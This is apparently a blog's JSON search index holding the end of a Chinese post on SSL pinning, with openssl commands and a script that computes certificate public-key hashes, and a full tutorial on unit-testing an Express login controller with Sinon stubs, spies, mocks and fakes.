CERTIFICATE-----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-----END CERTIFICATE----- 如果上面兩種擇一的話，選擇公鑰是會比較適合的因為同一把私鑰簽署出來的憑證的公鑰一定都會一樣，但如果是憑證內容就都會不一樣可以使用下面的指令試試看出來的結果1234567891011121314// 產出私鑰openssl genrsa -out key.pem 2048// 用同一把私鑰，產出兩組不同的憑證openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert1.pem -days 30openssl req -x509 -new -key key.pem -sha256 -nodes -keyout key.pem -out cert2.pem -days 30// 顯示公鑰是一樣openssl x509 -pubkey -noout -in cert1.pemopenssl x509 -pubkey -noout -in cert2.pem// 顯示憑證內容是不一樣openssl x509 -inform pem -in cert2.pemopenssl x509 -inform pem -in cert1.pem 這邊附上一個可以取得憑證公鑰的方法，把下面程式貼到 getPKfromDomain.sh 底下sh getPKfromDomain.sh github.com，就會出現憑證鏈全部的公鑰 (都是 sha256 + base64 後123456789101112#!/bin/bashcerts=`openssl s_client -connect $1:443 -showcerts &lt;/dev/null 2&gt;/dev/null | sed -n '/Certificate chain/,/Server certificate/p'`rest=$certswhile [[ &quot;$rest&quot; =~ '-----BEGIN CERTIFICATE-----' ]]do cert=&quot;${rest%%-----END CERTIFICATE-----*}-----END CERTIFICATE-----&quot; rest=${rest#*-----END CERTIFICATE-----} echo `echo &quot;$cert&quot; | grep 's:' | sed 's/.*s:\\(.*\\)/\\1/'` echo &quot;$cert&quot; | openssl x509 -pubkey -noout | openssl rsa -pubin -outform der 2&gt;/dev/null | openssl dgst -sha256 -binary | openssl enc -base64done 以 github.com 來說，結果如下123456$ sh getPKfromDomain.sh github.com/businessCategory=Private Organization/jurisdictionCountryName=US/jurisdictionStateOrProvinceName=Delaware/serialNumber=5157550/C=US/ST=California/L=San Francisco/O=GitHub, Inc./CN=github.como5oa5F4LbZEfeZ0kXDgmaU2K3sIPYtbQpT3EQLJZquM=/C=US/O=DigiCert Inc/OU=www.digicert.com/CN=DigiCert SHA2 Extended Validation Server CARRM1dGqnDFsCJXBTHky16vi1obOlCgFFn/yOhI/y+ho= 那如果當我的手機被中間人攻擊的話，拿到的就是下面這結果12345/C=PortSwigger/O=PortSwigger/OU=PortSwigger CA/CN=github.comDl+WeZh7lkGAd7otN+2fZEKoYTap20PkS4xpiUTi61Q=/C=PortSwigger/ST=PortSwigger/L=PortSwigger/O=PortSwigger/OU=PortSwigger CA/CN=PortSwigger CADl+WeZh7lkGAd7otN+2fZEKoYTap20PkS4xpiUTi61Q= 後記不過還是要注意的是，萬一私鑰被洩露然後 App 的 SSL Pinning 是寫死在程式裡面，這樣 App 就 100% 一定要升級版本，否則會出問題但如果你說，專門有一台憑證 API 去跟他要公鑰，其實這也會有問題因為攻擊者還是有辦法去偽造回傳的結果的 XD 另外如果對模擬中間人攻擊有興趣的，可以參考 burpsuit 的使用方法去學習屆時再使用 openssl s_client 的時候，記得最後面加上 -proxy 127.0.0.1:8080 連到 proxy 去模擬 References 那些關於SSL/TLS的二三事(九) — SSL (HTTPS)Communication 這裡有一系列對 SSL/TLS 的概念講解，推薦大家去閱讀看看 那些關於SSL/TLS的二三事(十二) — Chain of Trust Android Security: SSL Pinning","link":"/2020/03/02/ssl-pinning/"},{"title":"unit test 是什麼? 又該如何在 express 開發上實作 unit test?","text":"前言[2019-12-22 Update]在express unit test 一些技巧教學以及困難點裡面有針對一些技巧做說明以及增加測試涵蓋率的使用方式 在很久很久之前有提到過 unit test但那時候只有針對簡單到不能在簡單的 function 進行 unit test想必大家一定也不太了解 unit test 究竟要怎麼用在真正開發上面 在真正開發上面要用到 unit test一定會牽扯到讀取資料庫、讀取檔案、呼叫 API 等等複雜邏輯難道在做測試的時候，我還要確保我的 API 可以呼叫資料庫可以進行連線等等後，我才能確認我的程式是否正確嗎?在這種情況下要做 unit test 真的是一件不簡單的事情更別說 test cases 跑到一半有人把你測試環境的 database 亂改動，或是 API Server 的分支改掉這種鳥事了… 這樣的話，究竟要透過什麼樣的方式可以去做到 unit test 呢?其實可以透過 mock 的機制，讓呼叫 API 回傳值回傳一個固定值，而並不需要去真正呼叫 API 這裡所說的 mock 只是 unit test 使用到的一種方式其他還包含 spy 、stub、fake 等等我們通常稱這些為 test double (測試替身)以下會先介紹剛剛提到的 test double 題外話，一開始看到這名詞讓我一直想到 JOJO .. Test Double - 測試替身根據搞笑談軟功裡面其實有提到五種，但我這邊會介紹個人常見和常用到的四種 stub當程式是使用到 HTTP 相關操作的，為了測試相依性降到最低可以透過 stub 去變更發出 HTTP 程式的行為，變成不真的發出 HTTP，且可以自定義回傳的結果還有包含讀檔的行為也是如此，利用 stub 取代真的讀檔的行為，使測試可以更關注在程式邏輯上面而一般使用 stub 都會寫死回傳的資訊，以方便後續測試 使用情景: [假資料回傳]HTTP Request, 讀檔, 讀取資料庫等等，後續程式還沒實作的狀況下可以用來測試程式邏輯 spy此 double 是用在去紀錄 function 的行為驗證上面被 spy 的 function 就像是被安插間諜一樣，會去收集行為function 也會真的被執行，並不會像 stub 一樣被取代掉以 function 裡面 post http 為例，此 post http 是會真的發送請求出去，但會被紀錄如果是用 stub 的話，post http 則是不會發送請求出去 使用情景: [行為驗證]因為程式是真的會執行，所以會專注在驗證程式執行的行為驗證上，例如驗證程式應該只能跑一次等等的行為上 想了解更詳細的可以讀讀 Sinon.js 的文件內容，擷取部分原文如下 A test spy is a function that records arguments, return value, thevalue of this and exception thrown (if any) for all its calls.from Sinon Spy mockMock Object 則是類似於 spy 以及 stub 的集合體本身擁有可以取代物件的方法 (stub)，且內建 expect 方法可以驗證執行的行為是否正確 (spy)如果只是單純要讓後續程式邏輯接受固定值的話，用 stub 即可如果只是單純要驗證程式的行為，用 spy 即可但如果是以上兩個混合的狀況下，則是建議使用 Mock 使用情景: [行為驗證,假資料回傳]當需要驗證 HTTP POST 是否有根據所需參數進行執行，但又不想要真的發出 HTTP 的時候可以使用，跟 spy 最大差別在於 spy 是會真的執行程式，但 Mock 是不會真的去執行 想了解更詳細的可以讀讀 Sinon.js 的文件內容，擷取部分原文如下 Mocks (and mock expectations) are fake methods (like spies) with pre-programmed behavior (like stubs) as well as pre-programmed expectations.Mocks should only be used for the method under test. In every unit test, there should be one unit under test.In general you should have no more than one mock (possibly with several expectations) in a single test.from Sinon Mock fake此物件並不像是 spy 或是 stub 會取代程式裡面的行為而是建立一個實際可執行的 function，通常是用在建立 XHR or Server or Database 上面，但會是以更簡化的方式去實現例如原本可能是一個寄信的程式，但因為寄信驗證這件事情本身不好處理這邊可以做出一個 fake Object 是把寄信的訊息內容，改成寫檔，已達成寄信行為的驗證 使用情境：[簡化程式]簡化寄信，或是簡化 DB 連線改用 In-memory 的方式等等，目的就是要簡化 prodcution code 的複雜度 想了解更詳細的可以讀讀 Sinon.js 的文件內容，擷取部分原文如下 the sinon.fake API knows only how to create fakes, and doesn’t concern itself with plugging them into the system under test.To plug the fakes into the system under test, you can use the sinon.replace* methods.from Sinon Fake 小結結語要特別注意一件事情每一個測試框架針對這些 test double 可能會有一些些微的差距最好是針對測試框架裡面的文件進行閱讀去了解使用時機跟方式會比較恰當接下來就開始介紹關於 Sinon 這個測試框架的程式實作部分以及該如何搭配 express 進行 unit test 實作接下來會透過 express 搭配 sinon 進行 unit test 的說明首先我們會需要一個簡單的 express server此 server 功能有呼叫登入 API 以及寫檔兩種功能 為了方便進行 unit test 程式架構上，會進行拆分以模擬真實開發狀況登入的主要邏輯很單純1234567891011121314151617181920212223242526272829303132// server.js - listen 在 7070const authController = require(\"./authController\")app.post(\"/login\", authController.run);// authController.jsconst run = async (req, res) =&gt; { const { username } = {...req.body}; const result = await apiService.login(username) if (result.status !== 0) { return res.json({ message: \"登入失敗\" }) } return res.json({ message: \"登入成功\" })}// apiService.jsconst login = (username) =&gt; { return axios.post(\"http://localhost:7070/api\", { username, }).then((res) =&gt; res.data);}// 給 /login 用的, 不在測試範圍內app.post(\"/api\", (req, res) =&gt; { res.json({status: req.body.username === \"123\" ? 0 : 1})}) 在這種情況下要進行 unit test 必須要確保呼叫 apiService.login 是不會有任何問題的那如果要移除這層依賴，透過 test double 該如何對 authController.run 進行測試呢? Express with Sinon StubSinon Stub 介紹先介紹一下 Sinon Stub 如何使用，先看 code 1234const sinon = require(\"sinon\");const test = sinon.stub().returns(5);console.log(test());// 5 透過 stub 這個 function 接到的回傳值會是一個 function而這個 function 可以自定義呼叫的時候會有什麼樣的行為上面的範例中，我們讓他呼叫後得到的回傳是 5 那如果要得到類似 {status: 0} 這種結果呢? 方法如下123const test = sinon.stub().returns({status: 0});console.log(test());// {status: 0} 那如果說是要取代原本 function 的功能呢?1234567891011const sinon = require(\"sinon\");const obj = { test: function() { return \"this is test.\" }}console.log(obj.test());// \"this is test.\"sinon.stub(obj, \"test\").resolves({status: 0});console.log(obj.test());// Promise { { status: 0 } } 透過以上方法，obj 裡面的 test function 就被取代掉然後讓這個 function 回傳一個 promise.resolve 的結果 但如果說我的 function 要接收一個參數，然後指定回傳呢?12345678910111213const sinon = require(\"sinon\");const obj = { test: function(a) { return \"this is test: \" + a }}console.log(obj.test(\"test\"));// this is test: testsinon.stub(obj, \"test\").withArgs(\"123\").returns({status: 0});console.log(obj.test(\"123\"));// { status: 0 }console.log(obj.test());// undefined 透過 withArgs 可以設定，當這個 function 接收到什麼樣的參數的時候應該要回傳什麼樣的結果以上面的範例來說，只要這個 test function 的參數是 &quot;123&quot; 的話那他的回傳值就會是 { status: 0 }綜合以上的方法，就可以開始實作 unit test 了 如何在 express 上使用 stub回到正題因為是 express 的關係，所以 req 以及 res 的物件必須先透過 stub把 res 的行為先透過自訂義的方式給取代 這邊 req 不用的原因是，我們只取 req.body 的值所以可以直接當成 json 取值就好但 res 不能的原因是, express 再回傳的時候會需要多 call res.json() 來把值回傳回去 12345678910const mockRequest = (data) =&gt; { return { body: data }}const mockResponse = () =&gt; { const res = {}; res.json = sinon.stub().returns(res); return res;} 接下來正式的測試程式來了12345678910111213141516describe(\"[登入功能]\", () =&gt; { it(\"登入成功\", async () =&gt; { const req = mockRequest({ username: \"123\", }) const res = mockResponse(); sinon.stub(apiService, \"login\").withArgs(\"123\").resolves({ status: 0 }) await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入成功\", }); sinon.assert.calledOnce(res.json); })}) 透過使用 sinon.stub(apiService, &quot;login&quot;)可以把 apiService 裡面的 login function 實際行為給取消掉我們在後面定義了回傳一個 Promise.resolve 來指定被我們更改掉後應該回傳的資料也就是 sinon.stub(apiService, &quot;login&quot;).resolves(data) 裡面的 data這樣我們就可以讓 authController.run 裡面的 apiService.login不會真正去發送 POST Request，而是會回傳我們的結果執行 mocha 後的結果如下 接下來我們再增加一個 test case，程式碼如下12345678910111213141516171819202122232425262728293031323334const apiServiceLogin = sinon.stub(apiService, \"login\")describe(\"[登入功能]\", () =&gt; { beforeEach(() =&gt; { apiServiceLogin.reset() }) it(\"登入成功\", async () =&gt; { const req = mockRequest({ username: \"123\", }) const res = mockResponse(); apiServiceLogin.withArgs(\"123\").resolves({ status: 0 }) await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入成功\", }); sinon.assert.calledOnce(res.json); }) it(\"登入錯誤\", async () =&gt; { const req = mockRequest({ username: \"123\", }) const res = mockResponse(); apiServiceLogin.withArgs(\"123\").resolves({ status: 999 }) await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入失敗\", }); sinon.assert.calledOnce(res.json); })}) 這邊要注意，已經被取代掉的 function，行為已經被我們第一個 test case 給固定了為了要還原預設行為，必須在 beforeEach 加上 reset() 的方法去重置每一個 test case apiService.login 回傳的行為，結果如下 Express with Sinon SpySinon Spy12345const sinon = require(\"sinon\");const spy = sinon.spy();spy()console.log(spy.callCount);// 1 基本上所有測試替身呼叫後，都是會回傳一個可執行 function 回來根據前面介紹過，spy 是單純拿來做紀錄以及驗證上面的範例來說，就可以知道這個 function 被呼叫一次另外在 spy 的狀況下，function 實際行為是會被觸發，我們再來看另一段 code12345678910111213const sinon = require(\"sinon\");const obj = { test: function(a) { return \"this is test: \" + a }}const spy = sinon.spy(obj, \"test\");console.log(spy(\"hihi\"));// this is test: hihiconsole.log(obj.test(\"hihi2\"));// this is test: hihi2console.log(spy.callCount);// 2以上面的例子可以看到，程式實際上的邏輯是有被觸發成功的透過 spy 回傳的值，也是一個可執行的 function透過 spy() 或是 obj.test() 去觸發，都會被記錄起來 如何在 express 上使用 spy程式碼會增加一段對 username 進行 hash 再去做 login123456789101112131415161718192021// authControler.jsconst run = async (req, res) =&gt; { const { username } = {...req.body}; const result = await apiService.login(hash.sha256(username)) if (result.status !== 0) { return res.json({ message: \"登入失敗\" }) } return res.json({ message: \"登入成功\" })}// hash.jsconst sha256 = (username) =&gt; { const t = ctypto.createHash(\"sha256\"); return t.update(username, \"utf8\").digest(\"base64\");} 先來跑跑看 unit test 會發現結果是錯的原因是因為原本設定好 login 的時候，參數應該會是帶 &quot;123&quot;但因為變成 hash 之後會改成 &quot;pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=&quot;把 unit test 裡面的 withArgs 改成 apiServiceLogin.withArgs(&quot;pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=&quot;) 即可 此時我們想要針對 hash.sha256 進行次數監控1234567891011121314151617181920212223242526272829303132333435const hashSha256 = sinon.spy(hash, \"sha256\");beforeEach(() =&gt; { apiServiceLogin.reset() hashSha256.resetHistory() }) it(\"登入成功, hash 一次\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceLogin.withArgs(\"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=\").resolves({ status: 0 }) await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入成功\", }); sinon.assert.calledOnce(res.json); sinon.assert.calledOnce(hashSha256) }) it(\"登入錯誤, hash 一次\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceLogin.withArgs(\"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=\").resolves({ status: 999 }) await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入失敗\", }); sinon.assert.calledOnce(res.json); sinon.assert.calledOnce(hashSha256) }) 先在最前面加上 const hashSha256 = sinon.spy(hash, &quot;sha256&quot;); 取完成 spy 的動作然後在最後面加上了驗證 sinon.assert.calledOnce(hashSha256) 就可以完成驗證動作除此之外，要先在 beforeEach 加上 hashSha256.resetHistory() 去重置計算次數 Express with Sinon MockSinon Mock不同於 stub 以及 spy透過 mock 回傳的東西並不是一個可執行的 function而是要透過此 mock 去進行設定，類似『驗證』用的東西以及可以像是 stub 一樣，指定在 function 被呼叫的時候，應該會有什麼樣的回傳值但又不同於 stub 以及 spy，mock 並不能直接去針對某一個做 mock而是只能會對整個 obj 做 mock12345678910111213141516const sinon = require(\"sinon\");const obj = { test: function(a) { return \"this is test: \" + a }};const mock = sinon.mock(obj);// 驗證只能最多被呼叫 2 次mock.expects(\"test\").atLeast(2).returns({status: 1})console.log(obj.test());// { status: 1 }console.log(obj.test());// { status: 1 }mock.verify() 透過 mock.expects(&quot;test&quot;).atLeast(2).returns({status: 1}) 去設定預期哪一個 method 應該回傳什麼樣的值以及設定可被執行的次數最後再透過 mock.verify() 可以啟用這個 assertion除此之外，如果想要回復這個被 mock 原始的 method 的話可以透過 mock.restore() 去做回覆的動作這樣回覆之後，就會執行原本 function 的邏輯了 如何在 express 上使用 mock基本上程式碼跟上一個很像，但不一樣的地方在於我想要針對 apiService.js 去進行驗證，以及模擬回傳值12345678910111213141516171819202122232425262728293031const apiServiceLogin = sinon.mock(apiService);it(\"登入成功, hash 一次\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceLogin.expects(\"login\").withArgs(\"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=\").resolves({ status: 0 }).once(); await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入成功\", }); sinon.assert.calledOnce(res.json); sinon.assert.calledOnce(hashSha256) }) it(\"登入錯誤, hash 一次\", async () =&gt; { const req = mockRequest({ username: \"123\" }) const res = mockResponse(); apiServiceLogin.expects(\"login\").withArgs(\"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=\").resolves({ status: -1 }).once(); await authController.run(req, res) sinon.assert.calledWith(res.json, { message: \"登入失敗\", }); sinon.assert.calledOnce(res.json); sinon.assert.calledOnce(hashSha256) }) 差別在於以下程式，透過 mock，可以去指定回傳值，以及可以兼顧驗證用的功能123apiServiceLogin.expects(\"login\").withArgs(\"pmWkWSBCL51Bfkhn79xPuKBKHz//H6B+mY6G9/eieuM=\").resolves({ status: -1}).once(); Express with Sinon FakeSinon Fake在 Sinon 官網上對於 Fake 的說明是一種把 spy 跟 stub 混合的一種形式所以這邊後面並不會介紹如何在 express 上面實作而是會針對這個 fake 功能做些簡單的範例而已 1234const sinon = require(\"sinon\");const fake = sinon.fake.returns({status: 1});console.log(fake());{ status: 1 } 跟 stub 一樣可以指定該 function 應該回傳的值但他也有可以取代原本 method 的功能，程式如下 123456789101112const sinon = require(\"sinon\");const obj = { test: () =&gt; { return \"test\"; }}const fake = sinon.fake.returns({status: 1});console.log(obj.test());// testsinon.replace(obj, \"test\", fake)console.log(obj.test());// { status: 1 } 透過 sinon.replace，可以取代掉原本 function 的實際邏輯 結語以上介紹完每一個 test double 的意思以及使用場景但使用場景上，我也還在思考什麼樣的場景可以搭配什麼去使用歡迎各位一起在下面留言進行討論未來會再針對實務上 unit test 遇到的困難再回來整理一篇 References https://www.sitepoint.com/sinon-tutorial-javascript-testing-mocks-spies-stubs/ https://dev.to/milipski/test-doubles---fakes-mocks-and-stubs https://codewithhugo.com/express-request-response-mocking/ https://tpu.thinkpower.com.tw/tpu/articleDetails/1294 http://kaczanowscy.pl/tomek/2011-01/testing-basics-sut-and-docs","link":"/2019/12/10/unit-test-express/"}],"tags":[{"name":"API Gateway","slug":"API-Gateway","link":"/tags/API-Gateway/"},{"name":"aws","slug":"aws","link":"/tags/aws/"},{"name":"nodejs","slug":"nodejs","link":"/tags/nodejs/"},{"name":"session","slug":"session","link":"/tags/session/"},{"name":"cookie","slug":"cookie","link":"/tags/cookie/"},{"name":"cors","slug":"cors","link":"/tags/cors/"},{"name":"credential","slug":"credential","link":"/tags/credential/"},{"name":"certificate","slug":"certificate","link":"/tags/certificate/"},{"name":"acm","slug":"acm","link":"/tags/acm/"},{"name":"ec2","slug":"ec2","link":"/tags/ec2/"},{"name":"disk","slug":"disk","link":"/tags/disk/"},{"name":"ipv6","slug":"ipv6","link":"/tags/ipv6/"},{"name":"w3HexSchool","slug":"w3HexSchool","link":"/tags/w3HexSchool/"},{"name":"apple pay","slug":"apple-pay","link":"/tags/apple-pay/"},{"name":"debug","slug":"debug","link":"/tags/debug/"},{"name":"iOS","slug":"iOS","link":"/tags/iOS/"},{"name":"safari","slug":"safari","link":"/tags/safari/"},{"name":"CloudFront","slug":"CloudFront","link":"/tags/CloudFront/"},{"name":"query string","slug":"query-string","link":"/tags/query-string/"},{"name":"header","slug":"header","link":"/tags/header/"},{"name":"express","slug":"express","link":"/tags/express/"},{"name":"x-forwarded-for","slug":"x-forwarded-for","link":"/tags/x-forwarded-for/"},{"name":"ip","slug":"ip","link":"/tags/ip/"},{"name":"nginx","slug":"nginx","link":"/tags/nginx/"},{"name":"architecture","slug":"architecture","link":"/tags/architecture/"},{"name":"google hacking","slug":"google-hacking","link":"/tags/google-hacking/"},{"name":"search","slug":"search","link":"/tags/search/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"CloudWatch","slug":"CloudWatch","link":"/tags/CloudWatch/"},{"name":"lambda","slug":"lambda","link":"/tags/lambda/"},{"name":"upload file","slug":"upload-file","link":"/tags/upload-file/"},{"name":"download file","slug":"download-file","link":"/tags/download-file/"},{"name":"Test","slug":"Test","link":"/tags/Test/"},{"name":"Development","slug":"Development","link":"/tags/Development/"},{"name":"mocha","slug":"mocha","link":"/tags/mocha/"},{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"java","slug":"java","link":"/tags/java/"},{"name":"this","slug":"this","link":"/tags/this/"},{"name":"ngrok","slug":"ngrok","link":"/tags/ngrok/"},{"name":"localhost","slug":"localhost","link":"/tags/localhost/"},{"name":"DevOps","slug":"DevOps","link":"/tags/DevOps/"},{"name":"ssh","slug":"ssh","link":"/tags/ssh/"},{"name":"ssh tunnel","slug":"ssh-tunnel","link":"/tags/ssh-tunnel/"},{"name":"security header","slug":"security-header","link":"/tags/security-header/"},{"name":"HTTPS","slug":"HTTPS","link":"/tags/HTTPS/"},{"name":"promise","slug":"promise","link":"/tags/promise/"},{"name":"callback","slug":"callback","link":"/tags/callback/"},{"name":"async","slug":"async","link":"/tags/async/"},{"name":"await","slug":"await","link":"/tags/await/"},{"name":"vue","slug":"vue","link":"/tags/vue/"},{"name":"vuex","slug":"vuex","link":"/tags/vuex/"},{"name":"vue-router","slug":"vue-router","link":"/tags/vue-router/"},{"name":"todo-list","slug":"todo-list","link":"/tags/todo-list/"},{"name":"ecma6","slug":"ecma6","link":"/tags/ecma6/"},{"name":"讀書心得","slug":"讀書心得","link":"/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/"},{"name":"jenkins","slug":"jenkins","link":"/tags/jenkins/"},{"name":"CI/CD","slug":"CI-CD","link":"/tags/CI-CD/"},{"name":"network","slug":"network","link":"/tags/network/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"Executor","slug":"Executor","link":"/tags/Executor/"},{"name":"Thread Pool","slug":"Thread-Pool","link":"/tags/Thread-Pool/"},{"name":"TheadPoolExecutor","slug":"TheadPoolExecutor","link":"/tags/TheadPoolExecutor/"},{"name":"TapPay","slug":"TapPay","link":"/tags/TapPay/"},{"name":"Payment Gateway","slug":"Payment-Gateway","link":"/tags/Payment-Gateway/"},{"name":"unit test","slug":"unit-test","link":"/tags/unit-test/"},{"name":"sinon","slug":"sinon","link":"/tags/sinon/"},{"name":"slack","slug":"slack","link":"/tags/slack/"},{"name":"bot","slug":"bot","link":"/tags/bot/"},{"name":"chat bot","slug":"chat-bot","link":"/tags/chat-bot/"},{"name":"event loop","slug":"event-loop","link":"/tags/event-loop/"},{"name":"browser","slug":"browser","link":"/tags/browser/"},{"name":"Security","slug":"Security","link":"/tags/Security/"},{"name":"SSL","slug":"SSL","link":"/tags/SSL/"}],"categories":[{"name":"AWS","slug":"AWS","link":"/categories/AWS/"},{"name":"NodeJs","slug":"NodeJs","link":"/categories/NodeJs/"},{"name":"debug","slug":"debug","link":"/categories/debug/"},{"name":"Security","slug":"Security","link":"/categories/Security/"},{"name":"Google","slug":"Google","link":"/categories/Google/"},{"name":"Test","slug":"Test","link":"/categories/Test/"},{"name":"JavaScript","slug":"JavaScript","link":"/categories/JavaScript/"},{"name":"Java","slug":"Java","link":"/categories/Java/"},{"name":"tool","slug":"tool","link":"/categories/tool/"},{"name":"Development","slug":"Development","link":"/categories/Development/"},{"name":"Vue","slug":"Vue","link":"/categories/Vue/"},{"name":"讀書心得","slug":"讀書心得","link":"/categories/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/"},{"name":"DevOps","slug":"DevOps","link":"/categories/DevOps/"},{"name":"Payment Gateway","slug":"Payment-Gateway","link":"/categories/Payment-Gateway/"},{"name":"Bot","slug":"Bot","link":"/categories/Bot/"}]}